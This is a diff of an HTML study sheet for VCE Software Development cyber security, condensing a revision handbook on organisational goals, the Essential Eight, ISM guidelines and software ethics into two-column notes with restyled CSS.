@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Cyber Security · Revision Handbook</title>
+<title>Cyber Security · Condensed Revision</title>
 <style>
 @font-face{
   font-family:'Space Grotesk'; font-style:normal; font-weight:300 700; font-display:swap;
@@ -16,18 +16,18 @@
 <style>
 /* ============================================================
    VCE SOFTWARE DEVELOPMENT — CYBER SECURITY (WEEKS 1–4)
-   Personal revision handbook. Companion to the one-sheet SAC
-   poster (poster-cybersecurity-sac.html) — same content, but
-   set to be read and annotated rather than crammed.
-   Print : A4 portrait, flows over as many pages as it needs.
+   Condensed revision notes. The middle tier between the
+   one-sheet SAC poster (5.1pt, 2 sides) and cramming from the
+   full weekly notes: everything is here, in note form, set two
+   columns to the page at a readable 8pt.
    ============================================================ */
 
 :root{
   --ink:        #141C25;
-  --ink-soft:   #46535F;
+  --ink-soft:   #47545F;
   --ink-faint:  #7C8B98;
   --paper:      #FDFCFA;
-  --paper-2:    #F2F3F0;
+  --paper-2:    #F1F2EF;
   --rule:       #DCDED8;
   --rule-2:     #C3C7C0;
   --teal:       #0B6E76;
@@ -51,102 +51,84 @@ html{ background:#7E8A93; }
 body{
   font-family:var(--disp);
   color:var(--ink);
-  font-size:8.8pt;
-  line-height:1.38;
+  font-size:8pt;
+  line-height:1.33;
   background:var(--paper);
   -webkit-font-smoothing:antialiased;
 }
-.wrap{ max-width:186mm; margin:0 auto; padding:14mm 0 18mm; }
-
-@media screen{
-  body{ padding:0 8mm; }
-  .wrap{ box-shadow:none; }
-}
-@page{ size:A4 portrait; margin:13mm 11mm 12mm; }
+.wrap{ max-width:190mm; margin:0 auto; padding:12mm 0 16mm; }
+@media screen{ body{ padding:0 8mm; } }
+@page{ size:A4 portrait; margin:11mm 10mm 10mm; }
 @media print{
   html, body{ background:#fff; }
   .wrap{ max-width:none; padding:0; }
-  .no-print{ display:none !important; }
 }
 
 /* ── Masthead ──────────────────────────────────────────────── */
-.mast{ border-bottom:2pt solid var(--teal); padding-bottom:4mm; margin-bottom:5mm; }
+.mast{ border-bottom:1.6pt solid var(--teal); padding-bottom:2.6mm; margin-bottom:3.4mm; }
 .mast .kicker{
-  font-family:var(--mono); font-size:8pt; font-weight:700;
-  letter-spacing:.2em; text-transform:uppercase; color:var(--teal); margin-bottom:2.5mm;
+  font-family:var(--mono); font-size:6.8pt; font-weight:700;
+  letter-spacing:.2em; text-transform:uppercase; color:var(--teal); margin-bottom:1.6mm;
 }
-.mast h1{ font-size:24pt; font-weight:700; letter-spacing:-.025em; line-height:1.05; }
+.mast h1{ font-size:19pt; font-weight:700; letter-spacing:-.025em; line-height:1.05; }
 .mast h1 em{ font-style:normal; color:var(--teal); }
-.mast .sub{ font-size:9.6pt; color:var(--ink-soft); margin-top:2.5mm; max-width:150mm; }
+.mast .sub{ font-size:8.4pt; color:var(--ink-soft); margin-top:1.8mm; max-width:160mm; }
 
-/* ── Contents ──────────────────────────────────────────────── */
-.toc{
-  border:.8pt solid var(--rule-2); border-radius:2mm; background:var(--paper-2);
-  padding:4mm 5mm; margin-bottom:7mm; break-inside:avoid;
-}
-.toc h2{
-  font-family:var(--mono); font-size:8pt; font-weight:700; letter-spacing:.18em;
-  text-transform:uppercase; color:var(--teal); margin-bottom:2.5mm; border:0; padding:0;
-}
-.toc ol{ list-style:none; columns:2; column-gap:8mm; font-size:9pt; }
-.toc li{ padding-left:0; margin-bottom:1.2mm; break-inside:avoid; }
-.toc li::before{ content:none; }
-.toc .wk{ font-family:var(--mono); font-size:7.6pt; color:var(--teal); font-weight:700; margin-right:2mm; }
+/* ── Two-column flow ───────────────────────────────────────── */
+.flow{ columns:2; column-gap:7mm; column-fill:auto; }
+.full{ column-span:all; }
 
-/* ── Lessons & topics ──────────────────────────────────────── */
-.lesson{ margin-top:7.5mm; break-before:auto; }
+/* ── Lessons ───────────────────────────────────────────────── */
+.lesson{ margin-bottom:3.6mm; }
+
 .lesson > h2{
-  font-size:15pt; font-weight:700; letter-spacing:-.02em; line-height:1.15;
-  border-bottom:1.2pt solid var(--ink); padding-bottom:2mm; margin-bottom:1.5mm;
+  break-inside:avoid; font-size:10.4pt; font-weight:700; letter-spacing:-.018em; line-height:1.14;
+  border-bottom:1pt solid var(--ink); padding-bottom:1.1mm; margin-bottom:1.6mm;
   break-after:avoid;
 }
 .lesson > h2 .wk{
-  display:block; font-family:var(--mono); font-size:7.6pt; font-weight:700;
-  letter-spacing:.16em; text-transform:uppercase; color:var(--teal); margin-bottom:1.5mm;
+  display:block; font-family:var(--mono); font-size:6.4pt; font-weight:700;
+  letter-spacing:.15em; text-transform:uppercase; color:var(--teal); margin-bottom:.9mm;
 }
-.lesson > .intro{ font-size:9.4pt; color:var(--ink-soft); margin-bottom:4mm; max-width:160mm; }
-
 h3{
-  font-size:10.6pt; font-weight:700; letter-spacing:-.01em;
-  margin:4mm 0 1.6mm; break-after:avoid;
+  font-size:8.8pt; font-weight:700; margin:2.6mm 0 1.1mm; break-after:avoid;
+  color:var(--ink);
 }
-h3 .tag{
-  font-family:var(--mono); font-size:7.2pt; font-weight:700; letter-spacing:.14em;
-  text-transform:uppercase; color:var(--teal); display:block; margin-bottom:.8mm;
+h3::before{
+  content:''; display:inline-block; width:1.6mm; height:1.6mm; border-radius:50%;
+  background:var(--teal); margin-right:1.6mm; transform:translateY(-.3mm);
 }
-h4{ font-size:9.6pt; font-weight:700; margin:3mm 0 1.2mm; break-after:avoid; }
+h4{ font-size:8.1pt; font-weight:700; margin:2mm 0 .8mm; break-after:avoid; }
 
-p{ margin-bottom:1.9mm; max-width:170mm; }
+p{ margin-bottom:1.4mm; }
 p:last-child{ margin-bottom:0; }
 b, strong{ font-weight:700; }
-em{ font-style:italic; }
 
-ul, ol{ margin:0 0 2.5mm; padding-left:0; list-style:none; }
-li{ position:relative; padding-left:4.5mm; margin-bottom:.9mm; }
+ul, ol{ margin:0 0 1.6mm; padding-left:0; list-style:none; }
+li{ position:relative; padding-left:3.2mm; margin-bottom:.7mm; break-inside:avoid; }
 li::before{
-  content:''; position:absolute; left:.6mm; top:1.7mm;
-  width:1.5mm; height:1.5mm; border-radius:50%; background:var(--teal-2);
+  content:''; position:absolute; left:.3mm; top:1.35mm;
+  width:1.1mm; height:1.1mm; border-radius:50%; background:var(--teal-2);
 }
 ol{ counter-reset:n; }
-ol > li{ padding-left:6mm; }
+ol > li{ padding-left:4.4mm; }
 ol > li::before{
-  counter-increment:n; content:counter(n) '.'; background:none; border-radius:0;
-  font-family:var(--mono); font-size:8pt; font-weight:700; color:var(--teal);
-  width:auto; height:auto; top:0; left:0;
+  counter-increment:n; content:counter(n) '.'; background:none;
+  font-family:var(--mono); font-size:6.8pt; font-weight:700; color:var(--teal);
+  width:auto; height:auto; top:.1mm; left:0;
 }
-li > ul{ margin-top:1.1mm; margin-bottom:0; }
 
 /* ── Boxes ─────────────────────────────────────────────────── */
 .box{
-  border:.8pt solid var(--rule); border-left:2.4pt solid var(--teal);
-  border-radius:1.6mm; background:#fff;
-  padding:2.3mm 3mm; margin:2mm 0; break-inside:avoid;
+  border:.6pt solid var(--rule); border-left:1.8pt solid var(--teal);
+  border-radius:1.2mm; background:#fff;
+  padding:1.6mm 2mm; margin:1.6mm 0; break-inside:avoid;
 }
 .box .lab{
-  font-family:var(--mono); font-size:7.2pt; font-weight:700; letter-spacing:.14em;
-  text-transform:uppercase; color:var(--teal); margin-bottom:1.2mm;
+  font-family:var(--mono); font-size:6.2pt; font-weight:700; letter-spacing:.13em;
+  text-transform:uppercase; color:var(--teal); margin-bottom:.8mm;
 }
-.box.def{ background:var(--teal-wash); border-left-color:var(--teal); }
+.box.def{ background:var(--teal-wash); }
 .box.case{ background:var(--mag-wash); border-left-color:var(--mag); }
 .box.case .lab{ color:var(--mag); }
 .box.mit{ background:var(--green-wash); border-left-color:var(--green); }
@@ -157,70 +139,84 @@ li > ul{ margin-top:1.1mm; margin-bottom:0; }
 .box.warn .lab{ color:var(--rust); }
 .box.plain{ background:var(--paper-2); border-left-color:var(--rule-2); }
 .box.plain .lab{ color:var(--ink-faint); }
-.box ul:last-child, .box ol:last-child{ margin-bottom:0; }
+.box ul:last-child, .box ol:last-child, .box p:last-child{ margin-bottom:0; }
 
 /* ── Tables ────────────────────────────────────────────────── */
 table{
-  width:100%; border-collapse:collapse; font-size:8.5pt;
-  margin:2mm 0; break-inside:avoid;
+  width:100%; border-collapse:collapse; font-size:7.7pt;
+  margin:1.4mm 0; break-inside:avoid;
 }
+table.long{ break-inside:auto; }
 thead{ break-after:avoid; }
 th{
-  text-align:left; font-family:var(--mono); font-size:7.2pt; font-weight:700;
-  letter-spacing:.12em; text-transform:uppercase; color:var(--ink-faint);
-  border-bottom:1pt solid var(--ink); padding:0 2.5mm 1.6mm 0; vertical-align:bottom;
+  text-align:left; font-family:var(--mono); font-size:6.2pt; font-weight:700;
+  letter-spacing:.11em; text-transform:uppercase; color:var(--ink-faint);
+  border-bottom:.8pt solid var(--ink); padding:0 2mm 1mm 0; vertical-align:bottom;
 }
-td{ padding:1.3mm 2.5mm 1.3mm 0; border-bottom:.5pt solid var(--rule); vertical-align:top; }
+td{ padding:1mm 2mm 1mm 0; border-bottom:.4pt solid var(--rule); vertical-align:top; }
+tr{ break-inside:avoid; }
 tr:last-child td{ border-bottom:0; }
 td.who{ font-weight:700; }
 td.num{ font-family:var(--mono); font-weight:700; color:var(--teal); white-space:nowrap; }
+td.case{ color:var(--mag); font-weight:700; }
 
-/* ── Two-column split ──────────────────────────────────────── */
-.split{ display:grid; grid-template-columns:1fr 1fr; gap:3mm; margin:2.5mm 0; }
-.split.wide-left{ grid-template-columns:1.4fr 1fr; }
-@media print{ .split{ break-inside:avoid; } }
+/* ── Vulnerability cards ───────────────────────────────────── */
+.vuln{
+  border:.6pt solid var(--rule); border-left:1.8pt solid var(--mag);
+  border-radius:1.2mm; background:#fff; padding:1.5mm 1.9mm;
+  margin:1.5mm 0; break-inside:avoid;
+}
+.vuln .top{ font-size:8.3pt; font-weight:700; margin-bottom:.7mm; }
+.vuln .top .cs{ color:var(--mag); }
+.vuln .sub{ color:var(--ink-faint); font-weight:400; font-size:7.4pt; display:block; }
+.vuln .mit{
+  margin-top:1mm; padding-top:1mm; border-top:.4pt dotted var(--rule-2);
+  color:var(--ink-soft); font-size:7.5pt;
+}
+.vuln .mit b.k{
+  font-family:var(--mono); font-size:6.2pt; font-weight:700; letter-spacing:.12em;
+  text-transform:uppercase; color:var(--green); margin-right:1.2mm;
+}
 
 /* ── Advantage / disadvantage ──────────────────────────────── */
-.ad{ display:grid; grid-template-columns:1fr 1fr; gap:3mm; margin:2.5mm 0; break-inside:avoid; }
-.ad > div{ border-radius:1.6mm; padding:2.6mm 3.2mm; font-size:8.9pt; }
-.ad .a{ background:var(--green-wash); border-left:2.4pt solid var(--green); }
-.ad .d{ background:var(--rust-wash); border-left:2.4pt solid var(--rust); }
-.ad h4{ margin-top:0; }
+.ad{ display:grid; grid-template-columns:1fr 1fr; gap:1.6mm; margin:1.4mm 0; break-inside:avoid; }
+.ad > div{ border-radius:1.2mm; padding:1.4mm 1.8mm; font-size:7.7pt; }
+.ad .a{ background:var(--green-wash); border-left:1.8pt solid var(--green); }
+.ad .d{ background:var(--rust-wash); border-left:1.8pt solid var(--rust); }
+.ad h4{ margin:0 0 .6mm; }
 .ad .a h4{ color:var(--green); }
 .ad .d h4{ color:var(--rust); }
 .ad ul{ margin-bottom:0; }
-.ad li::before{ background:currentColor; opacity:.45; }
 
 /* ── Code ──────────────────────────────────────────────────── */
 code{
-  font-family:var(--mono); font-size:8pt; background:var(--paper-2);
-  border:.5pt solid var(--rule); border-radius:1mm; padding:.3mm 1.2mm;
+  font-family:var(--mono); font-size:6.9pt; background:var(--paper-2);
+  border:.4pt solid var(--rule); border-radius:.8mm; padding:.2mm .9mm;
   color:var(--mag); overflow-wrap:anywhere;
 }
 pre{
-  font-family:var(--mono); font-size:8.2pt; background:#0E1A22; color:#D9E7F1;
-  border-radius:1.6mm; padding:2.6mm 3.2mm; margin:2mm 0;
+  font-family:var(--mono); font-size:6.9pt; background:#0E1A22; color:#D9E7F1;
+  border-radius:1.2mm; padding:1.4mm 1.8mm; margin:1.2mm 0;
   white-space:pre-wrap; overflow-wrap:anywhere; break-inside:avoid;
 }
 pre .c{ color:#6D8BA3; }
 
-/* ── Recall prompts ────────────────────────────────────────── */
+/* ── Recall ────────────────────────────────────────────────── */
 .recall{
-  border:.8pt dashed var(--rule-2); border-radius:1.6mm;
-  padding:2.4mm 3mm; margin:3mm 0 0; background:#fff; break-inside:avoid;
+  border:.6pt dashed var(--rule-2); border-radius:1.2mm;
+  padding:1.6mm 2mm; margin:1.6mm 0; background:#fff; break-inside:avoid;
 }
 .recall .lab{
-  font-family:var(--mono); font-size:7.2pt; font-weight:700; letter-spacing:.14em;
-  text-transform:uppercase; color:var(--ink-faint); margin-bottom:1.5mm;
+  font-family:var(--mono); font-size:6.2pt; font-weight:700; letter-spacing:.13em;
+  text-transform:uppercase; color:var(--ink-faint); margin-bottom:.8mm;
 }
-.recall ol{ margin-bottom:0; font-size:8.9pt; color:var(--ink-soft); }
+.recall ol{ margin-bottom:0; font-size:7.7pt; color:var(--ink-soft); }
 .recall ol > li::before{ color:var(--ink-faint); }
 
-/* ── Misc ──────────────────────────────────────────────────── */
-.pagebreak{ break-before:page; }
+/* ── Footer ────────────────────────────────────────────────── */
 .foot{
-  margin-top:10mm; padding-top:3mm; border-top:.8pt solid var(--rule-2);
-  font-family:var(--mono); font-size:7.4pt; letter-spacing:.12em; text-transform:uppercase;
+  margin-top:4mm; padding-top:2mm; border-top:.6pt solid var(--rule-2);
+  font-family:var(--mono); font-size:6.4pt; letter-spacing:.11em; text-transform:uppercase;
   color:var(--ink-faint); display:flex; justify-content:space-between; gap:6mm;
 }
 .foot .r{ color:var(--teal); font-weight:700; }
@@ -230,1423 +226,721 @@ pre .c{ color:#6D8BA3; }
 <div class="wrap">
 <header class="mast">
   <div class="kicker">VCE Software Development · Unit 4 · Weeks 1–4</div>
-  <h1>Cyber Security: <em>a revision handbook</em></h1>
-  <p class="sub">Everything from the weekly notes, set to be read and annotated rather than crammed. This is the study version — the one-sheet poster is the version for the SAC desk. Each lesson closes with recall prompts: cover the page and answer them out loud before moving on.</p>
+  <h1>Cyber Security: <em>condensed revision</em></h1>
+  <p class="sub">Every topic from Weeks 1–4 in note form, two columns to the page. The middle tier: more room than the one-sheet SAC poster, far less paper than the full handbook. Recall prompts are collected on the last page — cover the notes and work through them.</p>
 </header>
-
-<nav class="toc">
-  <h2>Contents</h2>
-  <ol>
-    <li><span class="wk">W1 L1</span>Goals &amp; objectives of organisations</li>
-    <li><span class="wk">W1 L2</span>Industry frameworks — Essential Eight &amp; ISM</li>
-    <li><span class="wk">W1 L3</span>Ethics</li>
-    <li><span class="wk">W2 L1</span>Vulnerabilities, risks &amp; case studies</li>
-    <li><span class="wk">W2 L2</span>Mitigation measures</li>
-    <li><span class="wk">W2 L3</span>Social engineering attacks</li>
-    <li><span class="wk">W2 L4</span>Software security — XSS &amp; SQL injection</li>
-    <li><span class="wk">W2 L5</span>Key legislation</li>
-    <li><span class="wk">W2 L6</span>Improving development security</li>
-    <li><span class="wk">W3 L1</span>Security of data</li>
-    <li><span class="wk">W3 L2</span>Security controls in development</li>
-    <li><span class="wk">W4 L1</span>In-house vs external development</li>
-    <li><span class="wk">W4 L2</span>Threat modelling principles</li>
-    <li><span class="wk">W4 L3</span>Evaluating development security</li>
-  </ol>
-</nav>
-
-<!-- ═══════════════ W1 L1 ═══════════════ -->
+<div class="flow">
 <section class="lesson">
   <h2><span class="wk">Week 1 · Lesson 1</span>Goals &amp; Objectives of Organisations</h2>
-  <p class="intro">Why organisations build or buy software, and how that choice connects back to what the organisation is trying to achieve.</p>
-
   <div class="box def">
     <div class="lab">Definition</div>
-    <p><b>Software development</b> is the process of <b>conceiving, designing, creating, deploying and supporting</b> software applications.</p>
+    <p><b>Software development</b> — the process of <b>conceiving, designing, creating, deploying and supporting</b> software applications.</p>
   </div>
-
-  <h3><span class="tag">Four types of software</span>What gets built</h3>
-  <table>
-    <tr><td class="who" style="width:38mm">Systems software</td><td>Operating systems and device drivers.</td></tr>
-    <tr><td class="who">Programming software</td><td>Gives programmers the tools to create code.</td></tr>
-    <tr><td class="who">Applications</td><td>Helps users complete tasks, including web and mobile applications.</td></tr>
-    <tr><td class="who">Embedded software</td><td>Used to control machines and devices.</td></tr>
-  </table>
-
-  <h3><span class="tag">Purpose</span>Why software is developed</h3>
+  <h3>Four software types</h3>
   <ul>
-    <li>To meet the <b>specific needs</b> of specific users — <i>custom software</i>.</li>
-    <li>To meet a broad set of <b>perceived needs</b> of potential users — <i>commercial and open-source software</i>.</li>
-    <li>To <b>automate mundane tasks</b>, and for entertainment or education — <i>personal software</i>.</li>
+    <li><b>Systems software</b> — operating systems, device drivers.</li>
+    <li><b>Programming software</b> — tools for programmers to create code.</li>
+    <li><b>Applications</b> — help users complete tasks, incl. web and mobile.</li>
+    <li><b>Embedded software</b> — controls machines and devices.</li>
   </ul>
-
-  <h3><span class="tag">Direction</span>Goals vs objectives</h3>
-  <div class="split">
-    <div class="box">
-      <div class="lab">Goals</div>
-      <p><b>Long term.</b> State the intention or purpose of the organisation.</p>
-    </div>
-    <div class="box">
-      <div class="lab">Objectives</div>
-      <p>Clearly defined, <b>measurable, shorter-term steps</b> towards achieving those goals.</p>
-    </div>
-  </div>
-
-  <div class="box plain">
-    <div class="lab">Choosing the right software</div>
-    <ul>
-      <li>Organisations decide whether <b>generic, commercial/open-source, or custom</b> software is required.</li>
-      <li>If generic software is used, products must be <b>evaluated and compared</b> to find a suitable one.</li>
-      <li>Any software, custom or generic, must be evaluated to ensure it meets <b>privacy and security requirements</b>.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">Impact</span>Enhancing business processes</h3>
-  <table>
-    <tr><td class="who" style="width:38mm">Productivity</td><td>Increased efficiency, quality and capabilities.</td></tr>
-    <tr><td class="who">Managing information</td><td>Business intelligence to enhance decision-making and innovation.</td></tr>
-    <tr><td class="who">Cost reduction</td><td>Improving efficiency by automating processes.</td></tr>
-    <tr><td class="who">Collaboration</td><td>Facilitating cross-functional and remote teams.</td></tr>
-    <tr><td class="who">Accelerating growth</td><td>Enabling innovation, integration and collaboration.</td></tr>
-    <tr><td class="who">Sales &amp; service</td><td>Improving sales and customer service.</td></tr>
-    <tr><td class="who">Customer engagement</td><td>Increasing direct communication with customers.</td></tr>
-  </table>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>Give the four software types and one example of each.</li>
-      <li>What separates a goal from an objective? Write one of each for a school attendance app.</li>
-      <li>Name four ways software enhances business processes.</li>
-    </ol>
-  </div>
+  <h3>Why software is developed</h3>
+  <ul>
+    <li><b>Specific needs</b> of specific users — custom software.</li>
+    <li><b>Perceived needs</b> of potential users — commercial and open-source.</li>
+    <li><b>Automating mundane tasks</b>, entertainment, education — personal software.</li>
+  </ul>
+  <h3>Goals vs objectives</h3>
+  <ul>
+    <li><b>Goals</b> — long term; state the intention or purpose of the organisation.</li>
+    <li><b>Objectives</b> — clearly defined, <b>measurable, shorter-term steps</b> towards those goals.</li>
+  </ul>
+  <h3>Choosing software</h3>
+  <ul>
+    <li>Decide whether <b>generic, commercial/open-source or custom</b> is required.</li>
+    <li>Generic products must be <b>evaluated and compared</b> to find a suitable one.</li>
+    <li>Any software must be evaluated for <b>privacy and security requirements</b>.</li>
+  </ul>
+  <h3>Enhancing business processes</h3>
+  <ul>
+    <li><b>Productivity</b> — efficiency, quality, capabilities.</li>
+    <li><b>Managing information</b> — business intelligence for decisions and innovation.</li>
+    <li><b>Cost reduction</b> — automating processes.</li>
+    <li><b>Collaboration</b> — cross-functional and remote teams.</li>
+    <li><b>Accelerating growth</b> — innovation, integration, collaboration.</li>
+    <li><b>Sales &amp; service</b>, and <b>customer engagement</b> — direct communication with customers.</li>
+  </ul>
 </section>
 
-<!-- ═══════════════ W1 L2 ═══════════════ -->
 <section class="lesson">
   <h2><span class="wk">Week 1 · Lesson 2</span>Industry Frameworks</h2>
-  <p class="intro">Structured best practices that keep software development secure, compliant and maintainable — focusing on the two key Australian cyber security frameworks.</p>
-
   <div class="box def">
     <div class="lab">Definition</div>
-    <p><b>Industry frameworks</b> are structured sets of <b>best practices, standards and guidelines</b> designed to help organisations manage technology, data and security in a consistent, effective way — keeping systems secure, compliant with laws and policies, and efficient and maintainable.</p>
+    <p><b>Industry frameworks</b> — structured sets of <b>best practices, standards and guidelines</b> to manage technology, data and security consistently. Keep systems secure, compliant with laws and policies, efficient and maintainable.</p>
   </div>
-
-  <h3><span class="tag">Framework 1</span>The Essential Eight</h3>
-  <p>Baseline cyber security strategies developed by the <b>Australian Cyber Security Centre (ACSC)</b> to improve resilience against cyber threats — a practical, prioritised approach to defending against malware, unauthorised access and data breaches.</p>
+  <h3>Essential Eight <span style="font-weight:400;color:var(--ink-faint)">— ACSC, maturity levels 0–3</span></h3>
   <table>
-    <thead><tr><th style="width:10mm">#</th><th style="width:52mm">Strategy</th><th>What it does</th></tr></thead>
-    <tr><td class="num">01</td><td class="who">Application control</td><td>Prevents unapproved or malicious software from executing. Stops malware, ransomware and unauthorised applications.</td></tr>
-    <tr><td class="num">02</td><td class="who">Patch applications</td><td>Fixes security vulnerabilities in software. Prevents attackers exploiting known flaws.</td></tr>
-    <tr><td class="num">03</td><td class="who">Configure MS Office macros</td><td>Limits the use of potentially dangerous macros that can carry malware.</td></tr>
-    <tr><td class="num">04</td><td class="who">User application hardening</td><td>Disables unnecessary features in apps, e.g. Flash, ads, Java. Reduces exploit risks.</td></tr>
-    <tr><td class="num">05</td><td class="who">Restrict admin privileges</td><td>Only trusted users get admin rights, reducing internal and external attack risk.</td></tr>
-    <tr><td class="num">06</td><td class="who">Patch operating systems</td><td>Keeps system software updated to close known vulnerabilities.</td></tr>
-    <tr><td class="num">07</td><td class="who">Multi-factor authentication</td><td>Adds a layer beyond passwords — SMS code, authenticator app, token.</td></tr>
-    <tr><td class="num">08</td><td class="who">Regular backups</td><td>Ensures data can be restored after incidents such as ransomware or system failure.</td></tr>
+    <tr><td class="num">01</td><td class="who">Application control</td><td>Blocks unapproved or malicious software executing.</td></tr>
+    <tr><td class="num">02</td><td class="who">Patch applications</td><td>Fixes flaws before attackers exploit them.</td></tr>
+    <tr><td class="num">03</td><td class="who">Configure MS Office macros</td><td>Limits macros that can carry malware.</td></tr>
+    <tr><td class="num">04</td><td class="who">User application hardening</td><td>Disables unnecessary features — Flash, ads, Java.</td></tr>
+    <tr><td class="num">05</td><td class="who">Restrict admin privileges</td><td>Only trusted users get admin rights.</td></tr>
+    <tr><td class="num">06</td><td class="who">Patch operating systems</td><td>Closes known OS vulnerabilities.</td></tr>
+    <tr><td class="num">07</td><td class="who">Multi-factor authentication</td><td>A layer beyond passwords — SMS, app, token.</td></tr>
+    <tr><td class="num">08</td><td class="who">Regular backups</td><td>Restore after ransomware or system failure.</td></tr>
   </table>
-
-  <h3><span class="tag">Framework 2</span>The Information Security Manual (ISM)</h3>
-  <p>The <b>Australian Government's primary cyber security framework</b>, covering principles, guidelines and controls for building secure applications throughout the development lifecycle.</p>
-
-  <h4>Guideline 1 — Development, testing &amp; production environments</h4>
+  <h3>ISM <span style="font-weight:400;color:var(--ink-faint)">— the Government's primary framework</span></h3>
+  <h4>G1 · Development, testing &amp; production environments</h4>
   <ul>
-    <li><b>Separation of environments</b> — keep development, testing and production systems separate. Prevents test code or bugs affecting live systems.</li>
-    <li><b>Access controls</b> — limit access to each environment. Developers shouldn't automatically have access to production.</li>
-    <li><b>Data handling</b> — don't use real production data in development or testing unless absolutely necessary, and always anonymise it.</li>
-    <li><b>Monitoring</b> — log who accesses what, and when, in all environments.</li>
+    <li><b>Separation</b> — keeps test code and bugs away from live systems.</li>
+    <li><b>Access controls</b> — developers shouldn't automatically reach production.</li>
+    <li><b>Data handling</b> — no real production data in dev/test unless necessary, and always anonymised.</li>
+    <li><b>Monitoring</b> — log who accessed what, and when, in all environments.</li>
   </ul>
-
-  <h4>Guideline 2 — Secure software design &amp; development</h4>
+  <h4>G2 · Secure software design &amp; development</h4>
   <ul>
-    <li><b>Secure coding standards</b> — use frameworks and languages supporting secure practices, e.g. input validation, output encoding.</li>
-    <li><b>Threat modelling</b> — think about how the software might be attacked and build protections into the design.</li>
-    <li><b>Code reviews</b> — other team members check code to catch bugs and security issues.</li>
-    <li><b>Training</b> — developers should be trained regularly in secure coding and current threats.</li>
+    <li><b>Secure coding standards</b> — input validation, output encoding.</li>
+    <li><b>Threat modelling</b> — build protections into the design.</li>
+    <li><b>Code reviews</b> and regular <b>developer training</b>.</li>
   </ul>
-
-  <h4>Guideline 3 — Application security testing</h4>
+  <h4>G3 · Application security testing</h4>
   <ul>
-    <li><b>Static analysis (SAST)</b> — tests source code <i>without running</i> the program, to find vulnerabilities early.</li>
-    <li><b>Dynamic analysis (DAST)</b> — tests the <i>running</i> application for security holes.</li>
-    <li><b>Penetration testing</b> — simulated attacks on the software to find weaknesses before hackers do.</li>
-    <li><b>Remediation &amp; retesting</b> — fix issues found during testing, then test again to confirm the fixes worked.</li>
+    <li><b>SAST</b> — static; tests source code <i>without running</i> it, finds issues early.</li>
+    <li><b>DAST</b> — dynamic; tests the <i>running</i> application.</li>
+    <li><b>Penetration testing</b> — simulated attacks before hackers find the gaps.</li>
+    <li><b>Remediation &amp; retesting</b> — fix, then confirm the fix worked.</li>
   </ul>
-
-  <div class="recall">
-    <div class="lab">Recall check</div>
-    <ol>
-      <li>List the Essential Eight in order. Which three are about keeping software current?</li>
-      <li>Why does the ISM insist on separating dev, test and production?</li>
-      <li>Explain the difference between SAST and DAST, and say when each is used.</li>
-    </ol>
-  </div>
 </section>
 
-<!-- ═══════════════ W1 L3 ═══════════════ -->
 <section class="lesson">
   <h2><span class="wk">Week 1 · Lesson 3</span>Ethics</h2>
-  <p class="intro">Software development decisions affect people's rights, privacy, safety and trust. Ethics is about doing what's right — not just what's legal or efficient.</p>
-
   <div class="box def">
     <div class="lab">Definitions</div>
-    <ul>
-      <li><b>Ethics</b> — a system of accepted rules about behaviour, based on what is considered right and wrong.</li>
-      <li><b>Code of ethics</b> — a guide of principles helping professionals conduct business honestly and with integrity.</li>
-    </ul>
-    <p>Some industries (e.g. banking, finance) have <b>laws</b> governing conduct; in others, a code of ethics is <b>voluntarily adopted</b>.</p>
+    <p><b>Ethics</b> — a system of accepted rules about behaviour, based on right and wrong. <b>Code of ethics</b> — principles helping professionals conduct business honestly and with integrity. Governed by <b>law</b> in some industries (banking, finance); <b>voluntary</b> in others.</p>
   </div>
-
-  <h3><span class="tag">Codes</span>Which codes matter</h3>
+  <h3>Codes that matter</h3>
   <ul>
-    <li><b>ACS Code of Professional Ethics</b> — the Australian Computer Society's core values are <b>honesty, trustworthiness and respect</b>.</li>
-    <li>ACM Software Engineering Code of Ethics.</li>
-    <li>ACM Code of Ethics and Professional Conduct (for members).</li>
-    <li>IEEE Code of Ethics.</li>
-    <li>Australia's AI Ethics Principles.</li>
+    <li><b>ACS Code of Professional Ethics</b> — core values <b>honesty, trustworthiness, respect</b>.</li>
+    <li>ACM Software Engineering Code · ACM Code of Ethics · IEEE Code of Ethics · Australia's AI Ethics Principles.</li>
   </ul>
-
+  <h3>The five ethical issues</h3>
+  <table>
+    <tr><td class="who">Ineffective security</td><td>Weak encryption, passwords or validation leaves users open to attack, leaks, identity theft — <i>an app exposing private messages</i>.</td></tr>
+    <tr><td class="who">Use of AI</td><td>Question training data source, accuracy and bias — <i>a recruitment app favouring certain genders or backgrounds</i>.</td></tr>
+    <tr><td class="who">IP &amp; copyright</td><td>Respect licences, credit creators, don't copy-paste without attribution — <i>libraries used without checking the licence</i>.</td></tr>
+    <tr><td class="who">Privacy &amp; metadata</td><td>Timestamps, location and device info can identify someone — <i>image metadata revealing where a user lives</i>.</td></tr>
+    <tr><td class="who">Content moderation</td><td>Duty to prevent offensive, harmful or unlawful content via filters, moderation, flagging — <i>hate speech left in comments</i>.</td></tr>
+  </table>
   <div class="box warn">
-    <div class="lab">Consequences of ignoring ethics</div>
-    <ul>
-      <li>Loss of user trust and respect.</li>
-      <li>Negative media attention and reputational damage.</li>
-      <li>Legal action or platform bans.</li>
-      <li>Long-term harm to individuals or communities.</li>
-    </ul>
-  </div>
-
-  <h3><span class="tag">The five issues</span>Ethical issues in development</h3>
-  <table>
-    <thead><tr><th style="width:40mm">Issue</th><th>What it means · example</th></tr></thead>
-    <tr><td class="who">Ineffective security practices</td><td>Failing to implement strong security — encryption, password protection, input validation — leaves users open to attack, data leaks or identity theft. <i>E.g. a poorly protected app exposing users' private messages through weak encryption.</i></td></tr>
-    <tr><td class="who">Use of AI during development</td><td>Developers must question the source of AI training data, whether AI-generated content is accurate, and whether its use could introduce bias or cause harm. <i>E.g. a recruitment app favouring certain genders or cultural backgrounds because of biased training data.</i></td></tr>
-    <tr><td class="who">Intellectual property &amp; copyright</td><td>Using someone else's code, images or algorithms without permission breaches copyright. Respect licences, credit creators, and don't copy-paste without attribution. <i>E.g. including third-party libraries without checking the licence type.</i></td></tr>
-    <tr><td class="who">User privacy &amp; metadata</td><td>Be cautious collecting or exposing user data, including metadata (timestamps, locations, device info) that can unintentionally identify someone. Sharing or storing data without consent breaches privacy. <i>E.g. a social media app sharing image metadata revealing where a user lives or works.</i></td></tr>
